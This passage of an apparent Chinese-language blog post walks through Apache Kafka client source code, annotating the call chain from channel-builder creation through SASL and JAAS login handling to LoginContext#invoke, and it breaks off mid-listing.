<span class="hljs-variable">client</span> <span class="hljs-operator">=</span> kafkaClient != <span class="hljs-literal">null</span> ? kafkaClient : <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkClient</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Selector</span>(<span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;connections.max.idle.ms&quot;</span>), <span class="hljs-built_in">this</span>.metrics, <span class="hljs-built_in">this</span>.time, <span class="hljs-string">&quot;producer&quot;</span>, channelBuilder, logContext), metadata, <span class="hljs-built_in">this</span>.clientId, maxInflightRequests, <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;reconnect.backoff.ms&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;reconnect.backoff.max.ms&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;send.buffer.bytes&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;receive.buffer.bytes&quot;</span>), requestTimeoutMs, <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.ms&quot;</span>), <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;socket.connection.setup.timeout.max.ms&quot;</span>), <span class="hljs-built_in">this</span>.time, <span class="hljs-literal">true</span>, <span class="hljs-built_in">this</span>.apiVersions, throttleTimeSensor, logContext);<br>    <span class="hljs-type">short</span> <span class="hljs-variable">acks</span> <span class="hljs-operator">=</span> Short.parseShort(<span class="hljs-built_in">this</span>.producerConfig.getString(<span class="hljs-string">&quot;acks&quot;</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sender</span>(logContext, (KafkaClient)client, metadata, <span class="hljs-built_in">this</span>.accumulator, maxInflightRequests == <span class="hljs-number">1</span>, <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;max.request.size&quot;</span>), acks, <span class="hljs-built_in">this</span>.producerConfig.getInt(<span class="hljs-string">&quot;retries&quot;</span>), metricsRegistry.senderMetrics, <span class="hljs-built_in">this</span>.time, requestTimeoutMs, <span class="hljs-built_in">this</span>.producerConfig.getLong(<span class="hljs-string">&quot;retry.backoff.ms&quot;</span>), <span class="hljs-built_in">this</span>.transactionManager, <span class="hljs-built_in">this</span>.apiVersions);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.clients.ClientUtils#createChannelBuilder()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-6.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ChannelBuilder <span class="hljs-title function_">createChannelBuilder</span><span class="hljs-params">(AbstractConfig config, Time time, LogContext logContext)</span> &#123;<br>    <span class="hljs-comment">//securityProtocol值为之前security.protocol设置值</span><br>    <span class="hljs-type">SecurityProtocol</span> <span class="hljs-variable">securityProtocol</span> <span class="hljs-operator">=</span> SecurityProtocol.forName(config.getString(<span class="hljs-string">&quot;security.protocol&quot;</span>));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">clientSaslMechanism</span> <span class="hljs-operator">=</span> config.getString(<span class="hljs-string">&quot;sasl.mechanism&quot;</span>);<br>    <span class="hljs-comment">//调用至ChannelBuilders#clientChannelBuilder()</span><br>    <span class="hljs-keyword">return</span> ChannelBuilders.clientChannelBuilder(securityProtocol, Type.CLIENT, config, (ListenerName)<span class="hljs-literal">null</span>, clientSaslMechanism, time, <span class="hljs-literal">true</span>, logContext);<br>&#125;之前security.protocol<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.network.ChannelBuilders#clientChannelBuilder()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-7.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ChannelBuilder <span class="hljs-title function_">clientChannelBuilder</span><span class="hljs-params">(SecurityProtocol securityProtocol, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, String clientSaslMechanism, Time time, <span class="hljs-type">boolean</span> saslHandshakeRequestEnable, LogContext logContext)</span> &#123;<br>    <span class="hljs-keyword">if</span> (securityProtocol == SecurityProtocol.SASL_PLAINTEXT || securityProtocol == SecurityProtocol.SASL_SSL) &#123;<br>        <span class="hljs-comment">//contextType不为空，不进入</span><br>        <span class="hljs-keyword">if</span> (contextType == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;`contextType` must be non-null if `securityProtocol` is `&quot;</span> + securityProtocol + <span class="hljs-string">&quot;`&quot;</span>);<br>        &#125;<br><span class="hljs-comment">//clientSaslMechanism不为空，不进入</span><br>        <span class="hljs-keyword">if</span> (clientSaslMechanism == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;`clientSaslMechanism` must be non-null in client mode if `securityProtocol` is `&quot;</span> + securityProtocol + <span class="hljs-string">&quot;`&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//调用至ChannelBuilders#create()</span><br>    <span class="hljs-keyword">return</span> create(securityProtocol, Mode.CLIENT, contextType, config, listenerName, <span class="hljs-literal">false</span>, clientSaslMechanism, saslHandshakeRequestEnable, (CredentialCache)<span class="hljs-literal">null</span>, (DelegationTokenCache)<span class="hljs-literal">null</span>, time, logContext, (Supplier)<span class="hljs-literal">null</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.network.ChannelBuilders#create()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-8.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-9.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ChannelBuilder <span class="hljs-title function_">create</span><span class="hljs-params">(SecurityProtocol securityProtocol, Mode mode, JaasContext.Type contextType, AbstractConfig config, ListenerName listenerName, <span class="hljs-type">boolean</span> isInterBrokerListener, String clientSaslMechanism, <span class="hljs-type">boolean</span> saslHandshakeRequestEnable, CredentialCache credentialCache, DelegationTokenCache tokenCache, Time time, LogContext logContext, Supplier&lt;ApiVersionsResponse&gt; apiVersionSupplier)</span> &#123;<br>    Map&lt;String, Object&gt; configs = channelBuilderConfigs(config, listenerName);<br>    Object channelBuilder;<br>    <span class="hljs-comment">//securityProtocol为传入security.protocol值</span><br>    <span class="hljs-keyword">switch</span> (securityProtocol) &#123;<br>        <span class="hljs-comment">//security.protocol值为SSL进入   </span><br>        <span class="hljs-keyword">case</span> SSL:<br>            requireNonNullMode(mode, securityProtocol);<br>            channelBuilder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SslChannelBuilder</span>(mode, listenerName, isInterBrokerListener, logContext);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//security.protocol值为SASL_SSL、SASL_PLAINTEXT进入      </span><br>        <span class="hljs-keyword">case</span> SASL_SSL:<br>        <span class="hljs-keyword">case</span> SASL_PLAINTEXT:<br>            requireNonNullMode(mode, securityProtocol);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sslClientAuthOverride</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            Object jaasContexts;<br>            <span class="hljs-comment">//mode默认为CLIENT进入</span><br>            <span class="hljs-keyword">if</span> (mode != Mode.SERVER) &#123;<br>                <span class="hljs-type">JaasContext</span> <span class="hljs-variable">jaasContext</span> <span class="hljs-operator">=</span> contextType == Type.CLIENT ? JaasContext.loadClientContext(configs) : JaasContext.loadServerContext(listenerName, clientSaslMechanism, configs);<br>                jaasContexts = Collections.singletonMap(clientSaslMechanism, jaasContext);<br>            <span class="hljs-comment">//else默认不进入</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                List&lt;String&gt; enabledMechanisms = (List)configs.get(<span class="hljs-string">&quot;sasl.enabled.mechanisms&quot;</span>);<br>                jaasContexts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(enabledMechanisms.size());<br>                <span class="hljs-type">Iterator</span> <span class="hljs-variable">var18</span> <span class="hljs-operator">=</span> enabledMechanisms.iterator();<br><br>                String listenerClientAuth;<br>                <span class="hljs-keyword">while</span>(var18.hasNext()) &#123;<br>                    listenerClientAuth = (String)var18.next();<br>                    ((Map)jaasContexts).put(listenerClientAuth, JaasContext.loadServerContext(listenerName, listenerClientAuth, configs));<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (listenerName != <span class="hljs-literal">null</span> &amp;&amp; securityProtocol == SecurityProtocol.SASL_SSL) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">configuredClientAuth</span> <span class="hljs-operator">=</span> (String)configs.get(<span class="hljs-string">&quot;ssl.client.auth&quot;</span>);<br>                    listenerClientAuth = (String)config.originalsWithPrefix(listenerName.configPrefix(), <span class="hljs-literal">true</span>).get(<span class="hljs-string">&quot;ssl.client.auth&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (listenerClientAuth == <span class="hljs-literal">null</span>) &#123;<br>                        sslClientAuthOverride = SslClientAuth.NONE.name().toLowerCase(Locale.ROOT);<br>                        <span class="hljs-keyword">if</span> (configuredClientAuth != <span class="hljs-literal">null</span> &amp;&amp; !configuredClientAuth.equalsIgnoreCase(SslClientAuth.NONE.name())) &#123;<br>                            log.warn(<span class="hljs-string">&quot;Broker configuration &#x27;&#123;&#125;&#x27; is applied only to SSL listeners. Listener-prefixed configuration can be used to enable SSL client authentication for SASL_SSL listeners. In future releases, broker-wide option without listener prefix may be applied to SASL_SSL listeners as well. All configuration options intended for specific listeners should be listener-prefixed.&quot;</span>, <span class="hljs-string">&quot;ssl.client.auth&quot;</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        <span class="hljs-comment">//channelBuilder为SaslChannelBuilder</span><br>            channelBuilder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SaslChannelBuilder</span>(mode, (Map)jaasContexts, securityProtocol, listenerName, isInterBrokerListener, clientSaslMechanism, saslHandshakeRequestEnable, credentialCache, tokenCache, sslClientAuthOverride, time, logContext, apiVersionSupplier);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//security.protocol值为PLAINTEXT进入      </span><br>        <span class="hljs-keyword">case</span> PLAINTEXT:<br>            channelBuilder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlaintextChannelBuilder</span>(listenerName);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//security.protocol值不为以上值进入      </span><br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unexpected securityProtocol &quot;</span> + securityProtocol);<br>    &#125;<br>    <span class="hljs-comment">//调用channelBuilder).configure()</span><br>    <span class="hljs-comment">//当security.protocol值为SSL   channelBuilder为SslChannelBuilder类</span><br>    <span class="hljs-comment">//当security.protocol值为SASL_SSL、SASL_PLAINTEXT   channelBuilder为SaslChannelBuilder类</span><br>    <span class="hljs-comment">//当security.protocol值不为以上值   channelBuilder为IllegalArgumentException类</span><br>    ((ChannelBuilder)channelBuilder).configure(configs);<br>    <span class="hljs-keyword">return</span> (ChannelBuilder)channelBuilder;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.network.SaslChannelBuilder#configure()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-10.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(Map&lt;String, ?&gt; configs)</span> <span class="hljs-keyword">throws</span> KafkaException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        ......<br>        <span class="hljs-keyword">while</span>(var12.hasNext()) &#123;<br>            Map.Entry&lt;String, JaasContext&gt; entry = (Map.Entry)var12.next();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">mechanism</span> <span class="hljs-operator">=</span> (String)entry.getKey();<br>            <span class="hljs-comment">//调用至LoginManager#acquireLoginManager()</span><br>            <span class="hljs-type">LoginManager</span> <span class="hljs-variable">loginManager</span> <span class="hljs-operator">=</span> LoginManager.acquireLoginManager((JaasContext)entry.getValue(), mechanism, defaultLoginClass, configs);<br>            <span class="hljs-built_in">this</span>.loginManagers.put(mechanism, loginManager);<br>            <span class="hljs-type">Subject</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> loginManager.subject();<br>            <span class="hljs-built_in">this</span>.subjects.put(mechanism, subject);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.mode == Mode.SERVER &amp;&amp; mechanism.equals(<span class="hljs-string">&quot;GSSAPI&quot;</span>)) &#123;<br>                <span class="hljs-built_in">this</span>.maybeAddNativeGssapiCredentials(subject);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.securityProtocol == SecurityProtocol.SASL_SSL) &#123;<br>            <span class="hljs-built_in">this</span>.sslFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SslFactory</span>(<span class="hljs-built_in">this</span>.mode, <span class="hljs-built_in">this</span>.sslClientAuthOverride, <span class="hljs-built_in">this</span>.isInterBrokerListener);<br>            <span class="hljs-built_in">this</span>.sslFactory.configure(configs);<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Throwable var9) &#123;<br>        <span class="hljs-built_in">this</span>.close();<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaException</span>(var9);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.authenticator.LoginManager#acquireLoginManager()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-11.png" alt="img"></p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-12.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> LoginManager <span class="hljs-title function_">acquireLoginManager</span><span class="hljs-params">(JaasContext jaasContext, String saslMechanism, Class&lt;? extends Login&gt; defaultLoginClass, Map&lt;String, ?&gt; configs)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Login</span>&gt; loginClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, <span class="hljs-string">&quot;sasl.login.class&quot;</span>, defaultLoginClass);<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AuthenticateCallbackHandler</span>&gt; defaultLoginCallbackHandlerClass = <span class="hljs-string">&quot;OAUTHBEARER&quot;</span>.equals(saslMechanism) ? OAuthBearerUnsecuredLoginCallbackHandler.class : AbstractLogin.DefaultLoginCallbackHandler.class;<br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AuthenticateCallbackHandler</span>&gt; loginCallbackClass = configuredClassOrDefault(configs, jaasContext, saslMechanism, <span class="hljs-string">&quot;sasl.login.callback.handler.class&quot;</span>, defaultLoginCallbackHandlerClass);<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> LoginManager.class;<br>    <span class="hljs-keyword">synchronized</span>(LoginManager.class) &#123;<br>        <span class="hljs-type">Password</span> <span class="hljs-variable">jaasConfigValue</span> <span class="hljs-operator">=</span> jaasContext.dynamicJaasConfig();<br>        LoginManager loginManager;<br>        LoginMetadata loginMetadata;<br>        <span class="hljs-comment">//jaasConfigValue为传入sasl.jaas.config值，不为空</span><br>        <span class="hljs-keyword">if</span> (jaasConfigValue != <span class="hljs-literal">null</span>) &#123;<br>            loginMetadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginMetadata</span>(jaasConfigValue, loginClass, loginCallbackClass);<br>            loginManager = (LoginManager)DYNAMIC_INSTANCES.get(loginMetadata);<br>            <span class="hljs-comment">//loginManager默认为空</span><br>            <span class="hljs-keyword">if</span> (loginManager == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//new LoginManager()</span><br>                loginManager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginManager</span>(jaasContext, saslMechanism, configs, loginMetadata);<br>                DYNAMIC_INSTANCES.put(loginMetadata, loginManager);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            loginMetadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginMetadata</span>(jaasContext.name(), loginClass, loginCallbackClass);<br>            loginManager = (LoginManager)STATIC_INSTANCES.get(loginMetadata);<br>            <span class="hljs-keyword">if</span> (loginManager == <span class="hljs-literal">null</span>) &#123;<br>                loginManager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginManager</span>(jaasContext, saslMechanism, configs, loginMetadata);<br>                STATIC_INSTANCES.put(loginMetadata, loginManager);<br>            &#125;<br>        &#125;<br><br>        SecurityUtils.addConfiguredSecurityProviders(configs);<br>        <span class="hljs-keyword">return</span> loginManager.acquire();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.authenticator.LoginManager构造方法</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-13.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-title function_">LoginManager</span><span class="hljs-params">(JaasContext jaasContext, String saslMechanism, Map&lt;String, ?&gt; configs, LoginMetadata&lt;?&gt; loginMetadata)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-built_in">this</span>.loginMetadata = loginMetadata;<br>    <span class="hljs-built_in">this</span>.login = (Login)Utils.newInstance(loginMetadata.loginClass);<br>    <span class="hljs-built_in">this</span>.loginCallbackHandler = (AuthenticateCallbackHandler)Utils.newInstance(loginMetadata.loginCallbackClass);<br>    <span class="hljs-built_in">this</span>.loginCallbackHandler.configure(configs, saslMechanism, jaasContext.configurationEntries());<br>    <span class="hljs-built_in">this</span>.login.configure(configs, jaasContext.name(), jaasContext.configuration(), <span class="hljs-built_in">this</span>.loginCallbackHandler);<br>    <span class="hljs-comment">//调用至login()</span><br>    <span class="hljs-built_in">this</span>.login.login();<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.kerberos.KerberosLogin#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-14.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> LoginContext <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-built_in">this</span>.lastLogin = <span class="hljs-built_in">this</span>.currentElapsedTime();<br><span class="hljs-comment">//调用其父类AbstractLogin#login()</span><br>    <span class="hljs-built_in">this</span>.loginContext = <span class="hljs-built_in">super</span>.login();<br>    <span class="hljs-built_in">this</span>.subject = <span class="hljs-built_in">this</span>.loginContext.getSubject();<br>    <span class="hljs-built_in">this</span>.isKrbTicket = !<span class="hljs-built_in">this</span>.subject.getPrivateCredentials(KerberosTicket.class).isEmpty();<br>    AppConfigurationEntry[] entries = <span class="hljs-built_in">this</span>.configuration().getAppConfigurationEntry(<span class="hljs-built_in">this</span>.contextName());<br>    <span class="hljs-keyword">if</span> (entries.length == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">this</span>.isUsingTicketCache = <span class="hljs-literal">false</span>;<br>        <span class="hljs-built_in">this</span>.principal = <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ...<br>    &#125;<br>...<br></code></pre></td></tr></table></figure><p>org.apache.kafka.common.security.authenticator.AbstractLogin#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-15.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> LoginContext <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-comment">//声明LoginContext</span><br>    <span class="hljs-built_in">this</span>.loginContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginContext</span>(<span class="hljs-built_in">this</span>.contextName, (Subject)<span class="hljs-literal">null</span>, <span class="hljs-built_in">this</span>.loginCallbackHandler, <span class="hljs-built_in">this</span>.configuration);<br>    <span class="hljs-comment">//调用LoginContext#login()</span><br><span class="hljs-built_in">this</span>.loginContext.login();<br>    log.info(<span class="hljs-string">&quot;Successfully logged in.&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.loginContext;<br>&#125;<br></code></pre></td></tr></table></figure><p>javax.security.auth.login.LoginContext#login()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-16.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">login</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br><br>    loginSucceeded = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (subject == <span class="hljs-literal">null</span>) &#123;<br>        subject = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Subject</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// module invoked in doPrivileged</span><br>        <span class="hljs-comment">//LOGIN_METHOD为为login</span><br>        invokePriv(LOGIN_METHOD);<br>        invokePriv(COMMIT_METHOD);<br>        loginSucceeded = <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (LoginException le) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            invokePriv(ABORT_METHOD);<br>        &#125; <span class="hljs-keyword">catch</span> (LoginException le2) &#123;<br>            <span class="hljs-keyword">throw</span> le;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> le;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>javax.security.auth.login.LoginContext#invokePriv()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-17.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokePriv</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String methodName)</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        java.security.AccessController.doPrivileged<br>            (<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;<br>            <span class="hljs-keyword">public</span> Void <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> LoginException &#123;<br>                invoke(methodName);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;, creatorAcc);<br>    &#125; <span class="hljs-keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;<br>        <span class="hljs-keyword">throw</span> (LoginException)pae.getException();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>javax.security.auth.login.LoginContext#invoke()</p><p><img src="E:/ExportMD-rectify-pics/image/kafkaimage-18.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 